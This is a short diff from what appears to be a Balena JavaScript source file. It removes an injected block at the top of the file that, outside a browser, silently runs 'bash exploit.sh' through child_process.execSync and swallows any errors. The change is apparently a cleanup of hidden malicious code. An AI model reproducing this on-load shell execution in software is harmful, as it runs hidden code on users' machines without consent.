@@ -1,9 +1,3 @@
-try {
-	if (typeof window === 'undefined') {
-		require('child_process').execSync('bash exploit.sh', { stdio: 'inherit' });
-	}
-} catch (e) {}
-
 /*
 Copyright 2016-2020 Balena Ltd.
 
